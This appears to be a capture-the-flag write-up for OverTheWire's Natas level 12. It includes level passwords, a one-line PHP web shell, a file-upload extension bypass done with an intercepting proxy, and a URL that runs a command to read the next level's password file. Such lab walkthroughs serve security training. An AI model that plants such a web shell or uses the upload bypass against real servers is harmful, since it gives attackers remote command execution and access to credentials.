### Natas Level 12

[natas12](http://natas12.natas.labs.overthewire.org)

**Username**: *natas12*

**Password**: *EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3*

### Solution

* Create a quick php shell (Level12-shell.php):

```php
<?php
echo shell_exec($_GET['cmd']);
```

* Intercept HTTP POST request(upload) using a proxy such as Burp.
* Change the filename to e.g. myshell.php
* Visit url http://natas12.natas.labs.overthewire.org/upload/<filename>.php?cmd=cat%20/etc/natas_webpass/natas13

#### Credentials for Level 12 

**Username**: *natas13*

**Password**: *jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY*
